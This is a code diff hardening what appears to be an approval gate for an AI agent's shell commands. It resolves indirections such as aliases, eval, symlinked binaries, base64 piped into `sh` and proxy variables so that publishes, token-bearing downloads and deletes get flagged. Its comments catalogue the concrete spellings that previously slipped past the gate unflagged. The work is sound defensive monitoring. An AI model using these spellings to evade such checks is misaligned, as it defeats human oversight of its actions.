@@ -283,11 +283,14 @@ export const COMMAND_RUNNERS = new Set([
   'arch',
   'builtin',
   'bunx',
+  // `busybox tee f` runs the applet named after it, so the applet is the command.
+  'busybox',
   'caffeinate',
   'catchsegv',
   'chronic',
   'chrt',
   'command',
+  'corepack',
   'doas',
   'env',
   'eval',
@@ -587,12 +590,14 @@ const withoutRunners = (tokens: readonly string[]): string[] => {
   // Each pass drops at least one token, so this terminates on any input, and an empty list returns
   // on the first check.
   for (;;) {
-    const head = (
-      unquoted(rest[0] ?? '')
-        .split('/')
-        .pop() ?? ''
-    ).toLowerCase();
-    if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(head) || SHELL_KEYWORDS.has(head)) {
+    const word = unquoted(rest[0] ?? '');
+    const head = (word.split('/').pop() ?? '').toLowerCase();
+    // The assignment is tested on the whole word and not on its last path element, because the
+    // value of one is very often a path: `PATH=/usr/local/bin:$PATH curl …` and
+    // `https_proxy=http://x:3128 pip …` are both assignments, and read after the split on `/`
+    // they are a command called `bin:$PATH` and one called `x:3128` - each of which names a
+    // program no reader here has a table for, in front of the real one.
+    if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(word) || SHELL_KEYWORDS.has(head)) {
       rest = rest.slice(1);
       continue;
     }
@@ -618,15 +623,28 @@ export const commandInterpreters = new Set([
   'ruby'
 ]);
 
-const INLINE_SCRIPT_FLAGS = ['-c', '-lc', '-e', '--eval'];
+/**
+ * The flag that says "the next argument is the script", in every spelling a shell or a runtime
+ * accepts it in.
+ *
+ * A cluster of short flags is one argument, and the script flag is read wherever it sits in the
+ * cluster rather than only when it stands alone: `bash -ec '…'`, `sh -euc '…'`, `bash -xc '…'` and
+ * `perl -pe '…'` all hand the next argument over exactly as `-c` and `-e` do. While this was a
+ * list of four spellings, the cluster forms read as a file to run - so the script was '' and
+ * every classifier that reads it, the write floor and the destination readers included, saw an
+ * interpreter running nothing. Measured through the shell arm before this line: a reader shown
+ * fifty lines of a file ran `bash -ec 'echo x > app.ts'` and the file was one line afterwards.
+ */
+const isInlineScriptFlag = (token: string): boolean =>
+  token === '--eval' || /^-[A-Za-z]*[ce]$/.test(token);
 
 /** The script text an interpreter was handed inline, or '' when it was given a file to run. */
 export const inlineScriptBody = (args: readonly string[]): string =>
   args
     .flatMap((argument, index) => {
-      if (INLINE_SCRIPT_FLAGS.includes(argument)) return [args[index + 1] ?? ''];
+      if (isInlineScriptFlag(argument)) return [args[index + 1] ?? ''];
       const separator = argument.indexOf('=');
-      return separator > 0 && INLINE_SCRIPT_FLAGS.includes(argument.slice(0, separator))
+      return separator > 0 && isInlineScriptFlag(argument.slice(0, separator))
         ? [argument.slice(separator + 1)]
         : [];
     })
@@ -643,7 +661,22 @@ export const inlineScriptBody = (args: readonly string[]): string =>
  */
 export const commandScript = (args: Record<string, unknown>): string => {
   const commandArgs = Array.isArray(args.args) ? args.args.map(String) : [];
-  return [inlineScriptBody(commandArgs), textValue(args.stdin)].filter(Boolean).join('\n');
+  /*
+   * The inline flags are read only when the program they are handed to is an interpreter. `-c`
+   * and `-e` mean something on most programs - `grep -c` counts, `grep -e` is a pattern - and
+   * reading every `-e` value as a script made `grep -rn -e '> app.ts' .` a script containing a
+   * redirect, which the write floor then refused as a whole-file write. The wrappers come off
+   * first, so `env -S`, `sudo` and `timeout` in front of the interpreter do not hide it. Stdin is
+   * read for every program: a script arrives there whatever the executable is called.
+   */
+  const tokens = withoutRunners([textValue(args.executable), ...commandArgs]);
+  const head = (
+    unquoted(tokens[0] ?? '')
+      .split('/')
+      .pop() ?? ''
+  ).toLowerCase();
+  const inline = commandInterpreters.has(head) ? inlineScriptBody(tokens.slice(1)) : '';
+  return [inline, textValue(args.stdin)].filter(Boolean).join('\n');
 };
 
 /**
@@ -743,6 +776,10 @@ export const safeNetworkExecutables = new Set([
  *
  * Only for the clients that honour it: a proxy variable in front of a program that ignores it names
  * nowhere the bytes go, and carding that would be carding the environment rather than the request.
+ * Which clients those are is `PROXY_HONOURING_EXECUTABLES`, and it is a wider list than the clients
+ * whose own arguments are read for an address: `pip`, `npm`, `gh` and `git` are asked for no
+ * address because their remote lives in configuration, and every one of them still opens its
+ * socket at the proxy when the variable is set.
  */
 const PROXY_VARIABLES = new Set([
   'all_proxy',
@@ -752,18 +789,38 @@ const PROXY_VARIABLES = new Set([
   'rsync_proxy'
 ]);
 
+/**
+ * The words of a script as assignments are found in it: split on whitespace AND on the operators
+ * and brackets a shell puts flush against a word, with a leading quote taken off.
+ *
+ * Split on whitespace alone, the assignment that opens a subshell or follows an operator with no
+ * space is one token with the operator glued on - `(https_proxy=x`, `true;https_proxy=x`,
+ * `x=$(https_proxy=x`, `echo x|https_proxy=x` - and an assignment regex anchored at the start of
+ * the token matches none of them. Measured on this tree, every one of those spellings in front of
+ * `pip download <token>` was 0 destinations and no card in balanced or autonomous, while the same
+ * script with one space after the bracket carded. The quote is the `env -S '…'` shape, where the
+ * whole command line is one quoted word and the assignment is its first character after the quote.
+ */
+const assignmentWords = (body: string): string[] =>
+  body
+    .split(/[\s;&|(){}`]+/)
+    .map((word) => word.replace(/^['"]+/, ''))
+    .filter(Boolean);
+
 const proxyOptionsFrom = (tokens: readonly string[], executable: string): string[] => {
-  if (!FETCH_CLIENT_EXECUTABLES.has(executable) && !REMOTE_SPEC_EXECUTABLES.has(executable))
-    return [];
+  if (!honoursProxy(executable)) return [];
   const options: string[] = [];
   for (const token of tokens) {
     const assignment = /^([A-Za-z_][A-Za-z0-9_]*)=(.+)$/.exec(token);
     if (!assignment) continue;
     const [, name = '', value = ''] = assignment;
     // A body split on whitespace keeps the operator that ended the command, so `export
-    // http_proxy=x:3128;` carries the semicolon into the port and quietly loses it.
-    if (PROXY_VARIABLES.has(name.toLowerCase()))
-      options.push('--proxy', value.replace(/[;&|)]+$/, ''));
+    // http_proxy=x:3128;` carries the semicolon into the port and quietly loses it; a quoted value
+    // keeps its closing quote the same way.
+    if (PROXY_VARIABLES.has(name.toLowerCase())) {
+      const bare = value.replace(/[;&|)'"]+$/, '').replace(/^['"]+/, '');
+      if (bare) options.push('--proxy', bare);
+    }
   }
   return options;
 };
@@ -783,8 +840,8 @@ const proxyOptionsFrom = (tokens: readonly string[], executable: string): string
  * back as no commands at all, and the caller treats that as unknown rather than as safe.
  */
 const nestedScript = (tokens: readonly string[]): string[] => {
-  const at = tokens.findIndex((token) =>
-    INLINE_SCRIPT_FLAGS.some((flag) => token === flag || token.startsWith(`${flag}=`))
+  const at = tokens.findIndex(
+    (token) => isInlineScriptFlag(token) || isInlineScriptFlag(token.split('=')[0] ?? '')
   );
   return at < 0
     ? []
@@ -793,7 +850,24 @@ const nestedScript = (tokens: readonly string[]): string[] => {
         .filter(Boolean);
 };
 
-export const scriptCommands = (body: string): string[][] => {
+/**
+ * The program a Python interpreter runs when it is told `-m`: the module IS the program.
+ *
+ * `python -m pip download <token>` is the spelling pip's own documentation recommends and it
+ * honours `https_proxy` exactly as `pip` does; read as a command called `python3`, the proxy in
+ * front of it was credited to a program that ignores it and the request was 0 destinations. The
+ * module is emitted beside the interpreter command, as a command of its own with the module's
+ * arguments, so every reader that has an opinion about `pip` or `twine` sees it. Only Python:
+ * `-m` means something else on every other interpreter here.
+ */
+const moduleRun = (executable: string, tokens: readonly string[]): string[] => {
+  if (!/^python[0-9.]*$/.test(executable)) return [];
+  const at = tokens.indexOf('-m');
+  const module = unquoted(tokens[at + 1] ?? '');
+  return at < 0 || !module ? [] : [module, ...tokens.slice(at + 2).map(unquoted)];
+};
+
+const commandsFromBody = (body: string): string[][] => {
   /*
    * A proxy set anywhere in a script applies to every fetch after it, and `export http_proxy=x;
    * curl y` puts the two in different segments, so a scan of one segment sees neither half of the
@@ -802,7 +876,7 @@ export const scriptCommands = (body: string): string[][] => {
    * credited too - which costs a card on a shape that would not have used the proxy, and the
    * alternative is missing the shape that does.
    */
-  const bodyTokens = body.split(/\s+/).filter(Boolean);
+  const bodyTokens = assignmentWords(body);
   return body.split(/\$\(|[|;&\n`]+/).flatMap((segment) => {
     /*
      * `FOO=1 curl https://x` runs curl, and so do `timeout 30 curl …` and `then curl …`. Whatever
@@ -857,7 +931,9 @@ export const scriptCommands = (body: string): string[][] => {
      * off before anything ran.
      */
     const nested: string[][] = [];
-    let inner = commandInterpreters.has(executable) ? nestedScript(tokens) : [];
+    let inner = commandInterpreters.has(executable)
+      ? ([nestedScript(tokens), moduleRun(executable, tokens)].find((found) => found.length) ?? [])
+      : [];
     /*
      * AND AGAIN, for as long as the thing inside is another interpreter. One level was measured and
      * repaired; two was not, and `bash -lc 'sh -c "bash -c \'npm publish\'"'` and
@@ -869,14 +945,364 @@ export const scriptCommands = (body: string): string[][] => {
      * Bounded at four rather than left to terminate on its own: each pass slices past an inline
      * flag and so must shorten, but a bound that is stated cannot be argued about, and nothing
      * anybody writes on purpose nests four interpreters.
+     *
+     * The proxy is appended to the inner command as it is to the outer one, because the inner
+     * command inherits the environment: `sh -c "https_proxy=x pip download …"` sets it inside and
+     * `https_proxy=x sh -c "pip download …"` sets it outside, and both open pip's socket at the
+     * proxy. Read over the whole body, the assignment is found either way; while only the outer
+     * command was given the option, both spellings were 0 destinations - and the head of the
+     * outer one is `sh`, which honours no proxy of its own.
      */
     for (let depth = 0; inner.length && depth < 4; depth += 1) {
-      nested.push(inner);
       const head = (inner[0] ?? '').split('/').pop() ?? '';
-      inner = commandInterpreters.has(head) ? nestedScript(inner.slice(1)) : [];
+      nested.push([...inner, ...proxyOptionsFrom(bodyTokens, head)]);
+      inner = commandInterpreters.has(head)
+        ? ([nestedScript(inner.slice(1)), moduleRun(head, inner.slice(1))].find(
+            (found) => found.length
+          ) ?? [])
+        : [];
     }
     return [command, ...nested];
   });
+};
+
+/**
+ * The names an identity substitution resolves to whatever program it is handed.
+ *
+ * `$(which npm)` prints the path to npm, `$(command -v npm)` prints npm, `` `type -p npm` `` prints
+ * its path: all three run npm afterwards, and the head this file reads was the substitution's own
+ * inner command (`which`) instead. These four are the ones whose whole job is to name a program, so
+ * `$(which X)` can be rewritten to `X` without guessing - unlike `$(cat url.txt)`, whose output is
+ * not its argument and which stays unresolved for the taint rule to keep asking about.
+ */
+const IDENTITY_LOOKUP = String.raw`which|type\s+-[pP]|command\s+-v[p]?|hash\s+-[pt]`;
+
+/**
+ * A body with the run-time indirections this file CAN resolve rewritten to what they resolve to.
+ *
+ * A card keyed on the head of a command is defeated the same way whether the head is wrapped
+ * (`sudo npm publish`, already handled) or PRODUCED - by a substitution the shell runs first
+ * (`$(which npm) publish`), by a variable the script assigned a line earlier (`n=npm; $n publish`),
+ * or by a parameter default (`${NPM:-npm} publish`). None of these is a wrapper, so `withoutRunners`
+ * never saw them; each is an ordinary shell expansion whose result is written down in the same
+ * script, so it can be resolved rather than guessed. What CANNOT be resolved - a variable with no
+ * assignment in view (`curl -s "$U"`), a substitution whose output is not its argument
+ * (`$(cat url.txt)`) - is left exactly as written, so the taint rule that depends on `$U` staying
+ * `$U` is untouched. The rewrite runs alongside the raw body, never instead of it, so no reader
+ * that already saw the literal shape loses it.
+ */
+const expandIndirections = (body: string): string => {
+  let out = body;
+  const identity = new RegExp(String.raw`\$\(\s*(?:${IDENTITY_LOOKUP})\s+([^)\s]+)\s*\)`, 'g');
+  const identityBackquote = new RegExp(
+    String.raw`\`\s*(?:${IDENTITY_LOOKUP})\s+([^\s\`]+)\s*\``,
+    'g'
+  );
+  const echoSub = /\$\(\s*(?:echo|printf)\s+([^)]*?)\s*\)/g;
+  const echoBackquote = /`\s*(?:echo|printf)\s+([^`]*?)\s*`/g;
+  out = out
+    .replace(identity, '$1')
+    .replace(identityBackquote, '$1')
+    .replace(echoSub, '$1')
+    .replace(echoBackquote, '$1');
+  /*
+   * A program copied or linked to a new name, and then run under it.
+   *
+   * `ln -s /usr/bin/pip ./p; https_proxy=x ./p download <token>` runs pip, and the head this file
+   * read was `p` - a name no table holds, so the proxy in front of it was environment for nothing
+   * and the request was 0 destinations in both modes. Two ordinary local commands turned every
+   * client this file knows into one it could not see. The copy is written down in the same
+   * script, so the new name is rewritten to the program it was made from wherever it stands as a
+   * head - and only as a head, with the assignments in front of it kept, since `./p` as an operand
+   * of something else is a file. Resolved for `cp`, `ln` and `install`, whose last operand is the
+   * new name; `cp -t DIR` puts the operands on the other side and is not read.
+   */
+  const copies = new Map<string, string>();
+  for (const match of out.matchAll(
+    /(?:^|[;&|(\n]|\bthen\b|\bdo\b)\s*(?:cp|ln|install)\s+(?:-[A-Za-z]+\s+)*(\S+)\s+(\S+)\s*(?=$|[;&|)\n])/g
+  )) {
+    const source = (match[1] ?? '').split('/').pop() ?? '';
+    const copy = match[2] ?? '';
+    if (source && copy && !/[$`*?[\]{}]/.test(copy) && !copy.startsWith('-'))
+      copies.set(copy, source);
+  }
+  for (const [copy, source] of copies) {
+    const escaped = copy.replace(/[.*+?^${}()|[\]\\/]/g, '\\$&');
+    out = out.replace(
+      new RegExp(
+        String.raw`(^|[;&|(\n]|\bthen\b|\bdo\b)(\s*(?:[A-Za-z_][A-Za-z0-9_]*=\S*\s+)*)${escaped}(?=\s|$)`,
+        'g'
+      ),
+      `$1$2${source}`
+    );
+  }
+  // Assignments whose value is a single word are the only ones usable as a head or an operand; a
+  // multi-word value is left alone rather than pasted in as one token.
+  const assignments = new Map<string, string>();
+  for (const match of out.matchAll(
+    /(?:^|[;&|(\n]|\bthen\b|\bdo\b)\s*([A-Za-z_][A-Za-z0-9_]*)=(?:"([^"]*)"|'([^']*)'|([^\s;&|)]*))/g
+  )) {
+    const value = match[2] ?? match[3] ?? match[4] ?? '';
+    // A single word with nothing left to expand: a value that still holds a `$` (`PATH=x:$PATH`) is
+    // not resolved to a literal and pasting it in would only rewrite the body to another unresolved
+    // form - and to a spurious second copy of a command that never changed.
+    if (!/\s/.test(value) && !value.includes('$')) assignments.set(match[1] ?? '', value);
+  }
+  // `set -- a b c` sets the positional parameters, and `"$@"` then replays them.
+  const positional = /(?:^|[;&|\n])\s*set\s+--\s+([^\n;&|]*)/
+    .exec(out)?.[1]
+    ?.trim()
+    .split(/\s+/)
+    .filter(Boolean);
+  // A parameter default fills in when the name is unset, which for a name this never saw assigned is
+  // always: `${NPM:-npm}` and `${x:-publish}` are the value the script chose to fall back to.
+  out = out.replace(
+    /\$\{([A-Za-z_][A-Za-z0-9_]*):[-=]([^}]*)\}/g,
+    (_whole, name: string, fallback: string) => assignments.get(name) ?? fallback
+  );
+  for (const [name, value] of [...assignments].sort(([a], [b]) => b.length - a.length)) {
+    out = out
+      .replace(new RegExp(String.raw`\$\{${name}\}`, 'g'), value)
+      .replace(new RegExp(String.raw`\$${name}(?![A-Za-z0-9_])`, 'g'), value);
+  }
+  if (positional?.length) out = out.replace(/"\$@"|"\$\*"|\$@|\$\*/g, positional.join(' '));
+  return out;
+};
+
+/**
+ * The tokens a decode or an echo puts on the pipe, or null when this cannot compute them.
+ *
+ * `echo npm publish | …` and `base64 -d <<< bnBt… | …` both produce a command for whatever reads
+ * the other end of the pipe, and both are computable here - the argument to `echo` is its output,
+ * and a base64 body is a pure function of its input. A stage whose output this cannot compute
+ * returns null, which stops the fold: a command assembled from output nobody can predict is not one
+ * to raise a card about.
+ */
+const pipeStageOutput = (stage: string, carried: string | null): string | null => {
+  const tokens = stage.split(/\s+/).filter(Boolean);
+  const head = tokens[0] ?? '';
+  if (head === 'echo') return tokens.slice(1).join(' ').replace(/["']/g, '');
+  if (head === 'printf')
+    return tokens
+      .slice(1)
+      .map((token) => token.replace(/["']/g, ''))
+      .filter((token) => token !== '%s' && token !== '\\n')
+      .join('');
+  if (head === 'base64' && tokens.some((t) => t === '-d' || t === '-D' || t === '--decode')) {
+    const hereString = /<<<\s*(?:"([^"]*)"|'([^']*)'|(\S+))/.exec(stage);
+    const input = hereString ? (hereString[1] ?? hereString[2] ?? hereString[3] ?? '') : carried;
+    if (input === null) return null;
+    try {
+      return Buffer.from(input, 'base64').toString('utf8');
+    } catch {
+      return null;
+    }
+  }
+  return null;
+};
+
+/**
+ * The command `xargs` will run, built from its template and the tokens arriving on its input.
+ *
+ * `echo publish | xargs npm` runs `npm publish`; `printf npm | xargs -I{} {} publish` runs
+ * `npm publish` with the input pasted where the replacement string sits. The runner's own options
+ * are stepped over the way `runnerBody` steps over `sudo`'s, so what is left is the command it
+ * builds - which is the thing a publish card is about, and which was invisible while `xargs` was
+ * read as the command itself.
+ */
+const xargsCommand = (rest: readonly string[], carried: string | null): string[][] => {
+  if (carried === null) return [];
+  const inputTokens = carried.split(/\s+/).filter(Boolean);
+  let replacement: string | null = null;
+  let index = 0;
+  for (; index < rest.length; index += 1) {
+    const token = rest[index] ?? '';
+    if (token.startsWith('-I') && token.length > 2) {
+      replacement = token.slice(2);
+      continue;
+    }
+    if (token === '-I' || token === '-i' || token === '--replace') {
+      replacement = rest[index + 1] ?? '{}';
+      index += token === '--replace' || token === '-i' ? 0 : 1;
+      continue;
+    }
+    if (token.startsWith('--replace=')) {
+      replacement = token.slice('--replace='.length);
+      continue;
+    }
+    if (
+      ['-n', '-L', '-P', '-d', '-a', '--max-args', '--max-procs', '--delimiter'].includes(token)
+    ) {
+      index += 1;
+      continue;
+    }
+    if (token.startsWith('-')) continue;
+    break;
+  }
+  const template = rest.slice(index);
+  if (!template.length) return [];
+  const command = replacement
+    ? template.map((token) => (token === replacement ? inputTokens.join(' ') : token))
+    : [...template, ...inputTokens];
+  return commandsFromBody(command.join(' '));
+};
+
+/**
+ * The commands a pipeline runs that its own text does not spell as commands.
+ *
+ * `… | xargs npm`, `… | bash` and `base64 -d <<< … | sh` all hand the next stage a command built
+ * from an earlier one, and none of it is a command `commandsFromBody` reads by splitting on the
+ * pipe. The output of each stage is folded forward; when a stage is an interpreter reading that
+ * output as its script, or `xargs` building a command out of it, the result is emitted.
+ */
+const pipelineCommands = (statement: string): string[][] => {
+  if (!statement.includes('|')) return [];
+  const out: string[][] = [];
+  let carried: string | null = null;
+  for (const stage of statement
+    .split('|')
+    .map((part) => part.trim())
+    .filter(Boolean)) {
+    const tokens = stage.split(/\s+/).filter(Boolean);
+    const head = (
+      unquoted(tokens[0] ?? '')
+        .split('/')
+        .pop() ?? ''
+    ).toLowerCase();
+    if (head === 'xargs') {
+      out.push(...xargsCommand(tokens.slice(1), carried));
+      carried = null;
+      continue;
+    }
+    // An interpreter with no script of its own reads the pipe as its script.
+    if (
+      commandInterpreters.has(head) &&
+      carried !== null &&
+      !tokens.slice(1).some((token) => !token.startsWith('-'))
+    ) {
+      out.push(...commandsFromBody(carried));
+      carried = null;
+      continue;
+    }
+    carried = pipeStageOutput(stage, carried);
+  }
+  return out;
+};
+
+/**
+ * The publish or deploy a language runtime shells out to, which its argument list never spells.
+ *
+ * `python3 -c "import os; os.system('npm publish')"` and
+ * `node -e "require('child_process').execSync('npm publish')"` run a publish through a string the
+ * runtime hands back to a shell, and the tokens `commandsFromBody` sees are Python or JavaScript,
+ * not a command. This is the publishing counterpart of the destructive-runtime-call rule: the exec
+ * construct is recognised, the command string inside it is read, and it is emitted ONLY when it is
+ * itself a publish or a deploy - so an ordinary `subprocess.run(['ls'])` adds nothing.
+ */
+const RUNTIME_EXEC_CALL =
+  /(?:os\.system|os\.popen|os\.exec[a-z]*|subprocess\.(?:run|call|check_output|check_call|Popen)|commands\.getoutput|execFileSync|execSync|spawnSync|execFile|spawn|IO\.popen|popen|system|exec)\s*\(([^)]*)\)/g;
+const runtimeExecPublishes = (body: string): string[][] => {
+  const out: string[][] = [];
+  const consider = (text: string): void => {
+    for (const command of commandsFromBody(text))
+      if (publishingOperation(command)) out.push(command);
+  };
+  for (const match of body.matchAll(RUNTIME_EXEC_CALL)) {
+    const literals = [...(match[1] ?? '').matchAll(/"([^"]*)"|'([^']*)'/g)].map(
+      (literal) => literal[1] ?? literal[2] ?? ''
+    );
+    if (literals.length) consider(literals.join(' '));
+  }
+  // Ruby's `%x{…}` and Perl's `%x(…)` run their contents through a shell exactly as the calls above.
+  for (const match of body.matchAll(/%x[({]([^)}]*)[)}]/g)) consider(match[1] ?? '');
+  return out;
+};
+
+/**
+ * The commands reachable through a construct the shell resolves at run time, beside the raw ones.
+ *
+ * An alias whose body holds the operation (`alias np="npm publish"; np`), a script written to a
+ * file and then run (`echo npm publish > p.sh; bash p.sh`), a here-string handed to an interpreter
+ * (`bash <<< "npm publish"`), a pipeline that builds a command, and a language runtime shelling
+ * out: each is a command whose text is somewhere in the script but not where a reader keyed on the
+ * head of a segment looks. Every one is resolved from what the script itself wrote down; a
+ * construct whose contents this cannot compute contributes nothing rather than a guess.
+ */
+const structuralCommands = (body: string): string[][] => {
+  const out: string[][] = [];
+  const aliases = new Map<string, string>();
+  for (const match of body.matchAll(
+    /\balias\s+([A-Za-z_][A-Za-z0-9_-]*)=(?:"([^"]*)"|'([^']*)'|(\S+))/g
+  ))
+    aliases.set(match[1] ?? '', match[2] ?? match[3] ?? match[4] ?? '');
+  const writtenFiles = new Map<string, string>();
+  /*
+   * Every assignment, whatever the width of its value, for `eval` alone. `expandIndirections`
+   * pastes a value in only when it is one word, because a multi-word value is not usable as a head
+   * or an operand anywhere else; `eval $cmd` is the one place it is, since eval re-parses the text
+   * as a command line. `cmd="npm publish"; eval $cmd` was 0 cards in both modes while the literal
+   * `eval "npm publish"` carded - only the indirection escaped.
+   */
+  const values = new Map<string, string>();
+  for (const match of body.matchAll(
+    /(?:^|[;&|(\n]|\bthen\b|\bdo\b)\s*([A-Za-z_][A-Za-z0-9_]*)=(?:"([^"]*)"|'([^']*)'|([^\s;&|)]*))/g
+  ))
+    values.set(match[1] ?? '', match[2] ?? match[3] ?? match[4] ?? '');
+  const statements = body
+    .split(/[;&\n]+|\bthen\b|\bdo\b/)
+    .map((part) => part.trim())
+    .filter(Boolean);
+  /*
+   * `source f` and `. f` run a written file in the current shell exactly as `bash f` runs it in a
+   * child, and they are the standard spellings for it; a regex naming only the interpreters
+   * resolved `echo npm publish > p.sh; bash p.sh` and left `; source p.sh` and `; . p.sh` unread.
+   */
+  const interpreter = String.raw`(?:command\s+|exec\s+)?(?:(?:ba|da|z)?sh|python3?|node|perl|ruby|source|\.)`;
+  for (const statement of statements) {
+    const written =
+      /^(?:echo|printf)\s+(.*?)\s*>>?\s*"?([^\s"']+)"?\s*$/.exec(statement) ??
+      // `echo … | tee f` writes the file as surely as a redirect does, and nothing read it.
+      /^(?:echo|printf)\s+(.*?)\s*\|\s*tee\s+(?:-[A-Za-z]+\s+)*"?([^\s"']+)"?\s*$/.exec(statement);
+    if (written) writtenFiles.set(written[2] ?? '', (written[1] ?? '').replace(/["']/g, '').trim());
+    const head = statement.split(/\s+/)[0] ?? '';
+    if (aliases.has(head)) out.push(...commandsFromBody(aliases.get(head) ?? ''));
+    const evaluated = /^eval\s+(.+)$/.exec(statement);
+    if (evaluated) {
+      const text = (evaluated[1] ?? '').replace(
+        /\$\{?([A-Za-z_][A-Za-z0-9_]*)\}?/g,
+        (whole, name: string) => values.get(name) ?? whole
+      );
+      out.push(...commandsFromBody(text.replace(/["']/g, '')));
+    }
+    out.push(...pipelineCommands(statement));
+    const hereString = new RegExp(
+      String.raw`^${interpreter}\b.*?<<<\s*(?:"([^"]*)"|'([^']*)'|(\S+))`
+    ).exec(statement);
+    if (hereString)
+      out.push(...commandsFromBody(hereString[1] ?? hereString[2] ?? hereString[3] ?? ''));
+    const fileRun = new RegExp(String.raw`^${interpreter}\s+"?([^\s"']+)"?\s*$`).exec(statement);
+    if (fileRun && writtenFiles.has(fileRun[1] ?? ''))
+      out.push(...commandsFromBody(writtenFiles.get(fileRun[1] ?? '') ?? ''));
+  }
+  out.push(...runtimeExecPublishes(body));
+  return out;
+};
+
+/**
+ * Every command a script runs, read at three depths: as written, with the run-time indirections
+ * this file can resolve rewritten to their result, and through the constructs that build a command
+ * the segment text does not spell. The three are unioned rather than chosen between, so a reader
+ * that already saw the raw shape keeps it and the resolved shapes are added beside it - the same
+ * emitted-beside rule the nested-interpreter walk already follows.
+ */
+export const scriptCommands = (body: string): string[][] => {
+  const base = commandsFromBody(body);
+  const expanded = expandIndirections(body);
+  return [
+    ...base,
+    ...(expanded === body ? [] : commandsFromBody(expanded)),
+    ...structuralCommands(body)
+  ];
 };
 
 /**
@@ -906,7 +1332,20 @@ export const effectiveCommands = (args: Record<string, unknown>): string[][] => 
     unquoted(tokens[0] ?? '')
       .split('/')
       .pop() ?? '';
-  if (commandInterpreters.has(executable)) return scriptCommands(commandScript(args));
+  if (commandInterpreters.has(executable)) {
+    /*
+     * A proxy set in front of the interpreter is inherited by everything the script runs:
+     * `{ executable: 'env', args: ['https_proxy=x', 'sh', '-c', 'pip download …'] }` opens pip's
+     * socket at the proxy exactly as the script spelling does. Read from the tokens the wrappers
+     * took off - the prefix in front of the interpreter - and appended to each command the script
+     * names that honours it. The script's own assignments are read by `commandsFromBody`.
+     */
+    const prefix = raw.slice(0, Math.max(0, raw.length - tokens.length));
+    return scriptCommands(commandScript(args)).map((command) => [
+      ...command,
+      ...proxyOptionsFrom(prefix, command[0] ?? '')
+    ]);
+  }
   return executable ? [[executable, ...tokens.slice(1), ...proxyOptionsFrom(raw, executable)]] : [];
 };
 
@@ -1142,8 +1581,9 @@ export const CHECKPOINT_CONTENT: readonly (readonly string[])[] = [
  * of them restored by the undo point the same turn had already taken.
  *
  * TWO SPELLINGS OF ONE PLACE. `shell` runs in `workspace/`, so a bare `dist` is `workspace/dist`;
- * and the rest of this repository writes that same file as `workspace/dist`, because `resolveInside`
- * in the runner accepts either. So a leading `workspace` or `.athanor` segment is read from the
+ * and the rest of this repository writes that same file as `workspace/dist`, because the runner
+ * folds a bare name into `workspace/` for a file path and for a cwd alike. So a leading
+ * `workspace` or `.athanor` segment is read from the
  * workspace root and every other relative path is read from the cwd, which makes the two spellings
  * one answer - the same equivalence `isDurableInstructionPath` already relies on. It is one answer
  * only where the cwd is at or inside a checkpointed tree, which is the ordinary case and the only
@@ -1188,7 +1628,9 @@ export const CHECKPOINT_CONTENT: readonly (readonly string[])[] = [
  * '.ssh'] }` deletes the agent's own SSH directory while naming a bare relative path. Reading a
  * bare name against a hard-coded `workspace/` would have freed exactly that call. The caller passes
  * the cwd it was given; a cwd that is itself outside the checkpoints makes every bare name outside
- * them too, which is the answer that call deserves.
+ * them too, which is the answer that call deserves. The cwd itself is read the way the runner
+ * reads it - `commandDirectory` below - so a bare `probe` is `workspace/probe` here as it is there,
+ * and `.` is the container root in both.
  */
 /**
  * Where `~` lands, as the segments below the workspace root that `$HOME` actually is.
@@ -1219,6 +1661,18 @@ export const CHECKPOINT_CONTENT: readonly (readonly string[])[] = [
  * how this defect arrived.
  */
 export const AGENT_HOME: readonly string[] = ['.home'];
+
+/**
+ * The leading names the runner keeps at the container root when it reads a command's `cwd`;
+ * every other bare name is read from `workspace/`. A copy of `CONTAINER_ONLY` in
+ * services/workspace-runner/src/files.ts, pinned against it in the test file, because a delete
+ * judged in one directory and performed in another is the hole this whole rule is about.
+ */
+export const CONTAINER_ONLY_DIRECTORIES: ReadonlySet<string> = new Set([
+  '.athanor',
+  '.config',
+  ...AGENT_HOME
+]);
 
 /**
  * Whether resolved segments sit under one of the checkpointed trees.
@@ -1280,8 +1734,34 @@ const rootRelative = (spelling: string, base: readonly string[]): string[] | nul
   return resolved;
 };
 
+/**
+ * Where a command's `cwd` puts it, as the runner resolves it.
+ *
+ * A bare name is read from `workspace/` - `probe` and `workspace/probe` are one directory - and it
+ * has to be read that way here too, or a delete under `probe` is judged against the container
+ * root, lands outside every checkpoint and cards, while the identical call spelt `workspace/probe`
+ * is free. Measured through the shipped `approvalRequirement` in autonomous with the bare spelling
+ * read against the root: `bash -lc 'rm -f old.txt'` from `probe` carded and from `workspace/probe`
+ * did not. `.` is the container root, the container's own directories stay where they are, `~` is
+ * HOME, and a cwd carrying `..` is read literally from the root, which is also what the runner does
+ * with it: none of those folds, so none of them frees anything the literal reading would not.
+ */
+const commandDirectory = (cwd: string): string[] | null => {
+  const cleaned = cwd.replace(/^['"]+|['"]+$/g, '');
+  const written = cleaned.split(/[\\/]+/).filter((segment) => segment && segment !== '.');
+  const first = written[0];
+  const bare =
+    first !== undefined &&
+    !cleaned.startsWith('/') &&
+    !written.includes('..') &&
+    !first.startsWith('~') &&
+    first !== 'workspace' &&
+    !CONTAINER_ONLY_DIRECTORIES.has(first);
+  return rootRelative(bare ? `workspace/${cleaned}` : cleaned, []);
+};
+
 export const insideCheckpointContent = (target: string, cwd = 'workspace'): boolean => {
-  const base = rootRelative(cwd, []);
+  const base = commandDirectory(cwd);
   const resolved = base && target ? rootRelative(target, base) : null;
   return resolved !== null && underCheckpointContent(resolved, true);
 };
@@ -1328,7 +1808,7 @@ export const removesUncoveredFile = (
   uncovered: readonly string[]
 ): boolean => {
   if (!uncovered.length) return false;
-  const base = rootRelative(cwd, []);
+  const base = commandDirectory(cwd);
   const resolved = base && target ? rootRelative(target, base) : null;
   if (!resolved) return true;
   return uncovered.some((path) => {
@@ -2674,8 +3154,9 @@ const optionValueAt = (
  * the bytes went to the third field. Worse than unreadable: unreadable now asks the owner, and this
  * answered confidently with the wrong host.
  *
- * `--connect-to h1:p1:h2:p2` is the same instruction in four fields. `-x/--proxy` needs no entry
- * because a proxy is written as an ordinary address and reads as one.
+ * `--connect-to h1:p1:h2:p2` is the same instruction in four fields. `-x/--proxy` is not here
+ * because a proxy JOINS the address rather than replacing it - both ends receive the bytes - and it
+ * has its own reader in `PROXY_OPTIONS`.
  *
  * When one of these is present the connection goes where it says and nowhere else, so its target
  * REPLACES the addresses the rest of the command names rather than joining them - a request that
